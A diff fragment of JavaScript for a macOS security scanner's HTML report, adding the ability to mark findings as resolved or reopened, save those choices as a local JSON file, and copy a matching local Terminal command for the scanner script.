+    html += '<section class="card"><div class="card-head"><h3 class="card-title">Findings</h3><span class="card-note">Resolve an item once you have checked it. It stays hidden unless something about it changes.</span></div>' +
+      '<div class="filters">' + viewChips + sevChips + "</div>" +
+      '<div id="findings-body">' + findingsTable(overviewList(), true, VIEW === "resolved") + "</div></section>";
     return html;
   }
 
@@ -1911,27 +2140,88 @@ td.r, th.r { text-align: right; }
 
   // ---------- shell ----------
   var content = document.getElementById("content");
-  content.innerHTML = MODULES.map(function (m) {
-    return '<section class="panel" role="tabpanel" id="panel-' + m.id + '" aria-labelledby="tab-' + m.id + '" hidden>' + RENDER[m.id]() + "</section>";
-  }).join("");
-
-  document.getElementById("nav").innerHTML = MODULES.map(function (m) {
-    var badge = "";
-    if (m.id !== "overview") {
-      var mf = moduleFindings(m.id), hh = countSev(mf, "high"), mm = countSev(mf, "medium");
-      if (hh) badge = '<span class="nav-badge high" aria-label="' + hh + ' high">' + hh + "</span>";
-      else if (mm) badge = '<span class="nav-badge medium" aria-label="' + mm + ' medium">' + mm + "</span>";
-    }
-    return '<button class="nav-btn" role="tab" id="tab-' + m.id + '" aria-controls="panel-' + m.id + '" data-goto="' + m.id + '">' + icon(m.id) + '<span class="nav-label">' + esc(m.label) + "</span>" + badge + "</button>";
-  }).join("");
-
+  var CURRENT = "overview";
   var meta = R.meta || {};
+  var SCRIPT = meta.script_path || "~/MacSentinelSynthesisScanner/mac_sentinel_synthesis_scanner.py";
+
+  function syncBar() {
+    var p = pendingChanges();
+    if (!p.length) return "";
+    var res = p.filter(function (id) { return LOCAL[id].resolved; });
+    var reo = p.filter(function (id) { return !LOCAL[id].resolved; });
+    var cmd = [];
+    if (res.length) cmd.push("python3 " + SCRIPT + " resolve " + res.join(" "));
+    if (reo.length) cmd.push("python3 " + SCRIPT + " unresolve " + reo.join(" "));
+    return '<div class="sync-bar" role="status"><div class="sync-text"><b>' + p.length + (p.length === 1 ? " change" : " changes") +
+      ' saved in this browser.</b> Save them to Synthesis Scanner so every future report hides them, on any browser.</div>' +
+      '<div class="sync-actions"><button class="act-btn primary" id="sync-save">Save to Synthesis Scanner</button>' +
+      '<button class="act-btn" id="sync-copy" data-cmd="' + esc(cmd.join(" && ")) + '">Copy Terminal command</button></div>' +
+      '<div class="sync-help">Save puts a small file in Downloads. The next report picks it up automatically and deletes it.</div></div>';
+  }
+
+  function renderAll() {
+    recompute();
+    for (var k in TABLES) delete TABLES[k];
+    tableSeq = 0;
+    content.innerHTML = '<div id="sync">' + syncBar() + "</div>" + MODULES.map(function (m) {
+      return '<section class="panel" role="tabpanel" id="panel-' + m.id + '" aria-labelledby="tab-' + m.id + '"' + (m.id === CURRENT ? "" : " hidden") + ">" + RENDER[m.id]() + "</section>";
+    }).join("");
+    document.getElementById("nav").innerHTML = MODULES.map(function (m) {
+      var badge = "";
+      if (m.id !== "overview") {
+        var mf = moduleFindings(m.id), hh = countSev(mf, "high"), mm = countSev(mf, "medium");
+        if (hh) badge = '<span class="nav-badge high" aria-label="' + hh + ' high">' + hh + "</span>";
+        else if (mm) badge = '<span class="nav-badge medium" aria-label="' + mm + ' medium">' + mm + "</span>";
+      }
+      return '<button class="nav-btn" role="tab" id="tab-' + m.id + '" aria-controls="panel-' + m.id + '" aria-selected="' + (m.id === CURRENT) + '" data-goto="' + m.id + '">' + icon(m.id) + '<span class="nav-label">' + esc(m.label) + "</span>" + badge + "</button>";
+    }).join("");
+  }
+
+  function setResolved(id, flag) {
+    var f = BY_ID[id];
+    if (!f) return;
+    if (!!f.resolved === flag) delete LOCAL[id];
+    else LOCAL[id] = { resolved: flag, at: new Date().toISOString(), title: f.title };
+    persistLocal();
+    var y = window.scrollY;
+    renderAll();
+    window.scrollTo(0, y);
+  }
+
+  function saveFile() {
+    var p = pendingChanges();
+    var payload = { format: "mac-sentinel-synthesis-scanner-resolutions", version: 1, created: new Date().toISOString(),
+      resolve: p.filter(function (id) { return LOCAL[id].resolved; }),
+      reopen: p.filter(function (id) { return !LOCAL[id].resolved; }) };
+    var blob = new Blob([JSON.stringify(payload, null, 1)], { type: "application/json" });
+    var a = document.createElement("a");
+    a.href = URL.createObjectURL(blob);
+    a.download = "mac-sentinel-synthesis-scanner-resolutions-" + Date.now() + ".json";
+    document.body.appendChild(a); a.click(); a.remove();
+    var b = document.getElementById("sync-save");
+    if (b) b.textContent = "Saved to Downloads";
+  }
+
+  function copyCmd(btn) {
+    var txt = btn.getAttribute("data-cmd");
+    function done() { btn.textContent = "Copied"; }
+    function fallback() {
+      var ta = document.createElement("textarea"); ta.value = txt; document.body.appendChild(ta); ta.select();
+      try { document.execCommand("copy"); done(); } catch (e) { window.prompt("Copy this command:", txt); }
+      ta.remove();
+    }
+    if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(txt).then(done, fallback);
+    else fallback();
+  }
+
+  renderAll();
   document.getElementById("meta").innerHTML =
     "<span>Host <b>" + esc(meta.hostname) + "</b></span><span>User <b>" + esc(meta.user) + "</b></span><span>macOS <b>" + esc(meta.macos_version) +
     "</b></span><span>Generated <b>" + fmtTime(meta.generated_at) + "</b></span>";
   document.getElementById("foot").innerHTML = "Read-only report. No admin rights used, no data leaves this Mac." + (meta.demo ? "<br><br>Showing demo data." : "");
 
   function show(id) {
+    CURRENT = id;
     MODULES.forEach(function (m) {
       document.getElementById("panel-" + m.id).hidden = m.id !== id;
       document.getElementById("tab-" + m.id).setAttribute("aria-selected", String(m.id === id));
@@ -1943,11 +2233,21 @@ td.r, th.r { text-align: right; }
   document.addEventListener("click", function (e) {
     var g = e.target.closest("[data-goto]");
     if (g) show(g.getAttribute("data-goto"));
-    var c = e.target.closest("#sev-chips .chip");
-    if (c) {
-      var s = c.getAttribute("data-sev");
-      document.querySelectorAll("#sev-chips .chip").forEach(function (x) { x.setAttribute("aria-pressed", String(x === c)); });
-      document.getElementById("findings-body").innerHTML = findingsTable(s === "all" ? findings : findings.filter(function (f) { return f.severity === s; }), true);
+    var r = e.target.closest("[data-resolve]");
+    if (r) { setResolved(r.getAttribute("data-resolve"), true); return; }
+    var o = e.target.closest("[data-reopen]");
+    if (o) { setResolved(o.getAttribute("data-reopen"), false); return; }
+    if (e.target.closest("#sync-save")) { saveFile(); return; }
+    var cp = e.target.closest("#sync-copy");
+    if (cp) { copyCmd(cp); return; }
+    var v = e.target.closest("[data-view]");
+    var s = e.target.closest("[data-sev]");
+    if (v || s) {
+      if (v) { VIEW = v.getAttribute("data-view"); SEVF = "all"; }
+      if (s) SEVF = s.getAttribute("data-sev");
+      var y = window.scrollY;
+      renderAll();
+      window.scrollTo(0, y);
     }
   });
   var start = (location.hash || "").slice(1);
